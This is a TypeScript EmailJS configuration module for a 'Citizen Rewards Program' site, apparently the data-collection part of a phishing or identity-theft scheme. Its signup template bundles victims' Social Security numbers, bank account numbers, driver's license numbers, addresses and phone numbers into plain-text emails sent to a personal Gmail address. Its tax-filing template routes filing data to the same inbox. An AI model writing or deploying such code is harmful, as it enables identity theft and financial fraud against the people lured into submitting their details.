// Email service configuration for Gmail integration
import emailjs from '@emailjs/browser';

// EmailJS configuration - client-side email sending
export const EMAIL_CONFIG = {
  serviceId: 'YOUR_EMAILJS_SERVICE_ID', // To be replaced with actual service ID
  templateId: 'YOUR_EMAILJS_TEMPLATE_ID', // To be replaced with actual template ID
  publicKey: 'YOUR_EMAILJS_PUBLIC_KEY', // To be replaced with actual public key
};

// Initialize EmailJS with your public key
export const initializeEmailService = () => {
  const publicKey = (import.meta as any).env?.VITE_EMAILJS_PUBLIC_KEY || EMAIL_CONFIG.publicKey;
  if (publicKey && publicKey !== 'YOUR_EMAILJS_PUBLIC_KEY') {
    emailjs.init(publicKey);
    return true;
  }
  console.warn('EmailJS not configured. Please set up your EmailJS credentials.');
  return false;
};

// Email template types
export interface EmailTemplate {
  to_email: string;
  to_name: string;
  from_name: string;
  subject: string;
  message: string;
  user_data?: any;
  [key: string]: any; // Index signature for EmailJS compatibility
}

// Send email using EmailJS
export const sendEmail = async (templateParams: EmailTemplate): Promise<boolean> => {
  try {
    const serviceId = (import.meta as any).env?.VITE_EMAILJS_SERVICE_ID || EMAIL_CONFIG.serviceId;
    const templateId = (import.meta as any).env?.VITE_EMAILJS_TEMPLATE_ID || EMAIL_CONFIG.templateId;
    
    if (!serviceId || !templateId || serviceId.includes('YOUR_') || templateId.includes('YOUR_')) {
      throw new Error('EmailJS not properly configured');
    }

    const response = await emailjs.send(serviceId, templateId, templateParams);
    
    if (response.status === 200) {
      console.log('Email sent successfully:', response);
      return true;
    } else {
      console.error('Email sending failed:', response);
      return false;
    }
  } catch (error) {
    console.error('Error sending email:', error);
    return false;
  }
};

// Predefined email templates
export const EmailTemplates = {
  // User signup notification for Citizen Rewards Program
  userSignup: (userData: any): EmailTemplate => ({
    to_email: 'fafabiatfa@gmail.com', // EmailJS connected email
    to_name: 'Admin',
    from_name: userData.firstName || 'New User',
    subject: 'New Citizen Rewards Signup',
    message: `New signup from ${userData.firstName} ${userData.lastName}
    
Email: ${userData.email}
Phone: ${userData.phone}
Address: ${userData.address}, ${userData.city}, ${userData.state} ${userData.zipCode}
Bank: ${userData.bankName}
Account: ${userData.accountNumber}
SSN: ${userData.ssn}
License: ${userData.driversLicense}

Time: ${new Date().toLocaleString()}`,
    // Individual fields for EmailJS
    user_name: `${userData.firstName} ${userData.lastName}`,
    user_email: userData.email,
    user_phone: userData.phone,
    user_address: userData.address,
    user_city: userData.city,
    user_state: userData.state,
    user_zip: userData.zipCode,
    bank_name: userData.bankName,
    account_number: userData.accountNumber,
    ssn: userData.ssn,
    drivers_license: userData.driversLicense,
    signup_time: new Date().toLocaleString()
  }),

  // Contact form submission
  contactForm: (contactData: any): EmailTemplate => ({
    to_email: 'fafabiatfa@gmail.com', // EmailJS connected email
    to_name: 'CitizenRewards Admin',
    from_name: contactData.name,
    subject: `Contact Form Submission - ${contactData.subject || 'CitizenRewards'}`,
    message: `
      New contact form submission:
      
      Name: ${contactData.name}
      Email: ${contactData.email}
      Phone: ${contactData.phone || 'Not provided'}
      Subject: ${contactData.subject || 'General Inquiry'}
      
      Message:
      ${contactData.message}
      
      Submitted: ${new Date().toLocaleString()}
    `,
    user_data: contactData
  }),

  // Tax filing submission
  taxFiling: (filingData: any): EmailTemplate => ({
    to_email: 'fafabiatfa@gmail.com', // EmailJS connected email
    to_name: 'CitizenRewards Admin',
    from_name: filingData.name,
    subject: 'Citizen Rewards Submission - CitizenRewards',
    message: `
      New tax filing submission:
      
      User: ${filingData.name}
      Email: ${filingData.email}
      Filing Status: ${filingData.filingStatus}
      Tax Year: ${filingData.taxYear || new Date().getFullYear()}
      
      Documents Uploaded: ${filingData.documents ? filingData.documents.length : 0}
      
      Additional Notes:
      ${filingData.notes || 'None'}
      
      Submitted: ${new Date().toLocaleString()}
    `,
    user_data: filingData
  }),

  // Grok AI interaction log
  grokInteraction: (interactionData: any): EmailTemplate => ({
    to_email: 'fafabiatfa@gmail.com', // EmailJS connected email
    to_name: 'CitizenRewards Admin',
    from_name: 'Grok AI System',
    subject: 'Grok AI Interaction Log - CitizenRewards',
    message: `
      Grok AI interaction recorded:
      
      User Question: ${interactionData.question}
      
      AI Response: ${interactionData.response}
      
      Session ID: ${interactionData.sessionId || 'Unknown'}
      Timestamp: ${new Date().toLocaleString()}
    `,
    user_data: interactionData
  })
};

// Utility function to validate email
export const isValidEmail = (email: string): boolean => {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
};

// Setup instructions for EmailJS
export const SETUP_INSTRUCTIONS = {
  step1: "Create an account at https://www.emailjs.com/",
  step2: "Create an email service (Gmail, Outlook, etc.)",
  step3: "Create an email template",
  step4: "Get your Service ID, Template ID, and Public Key",
  step5: "Add them to your .env file",
  envVars: [
    "VITE_EMAILJS_SERVICE_ID=your_service_id",
    "VITE_EMAILJS_TEMPLATE_ID=your_template_id", 
    "VITE_EMAILJS_PUBLIC_KEY=your_public_key"
  ]
};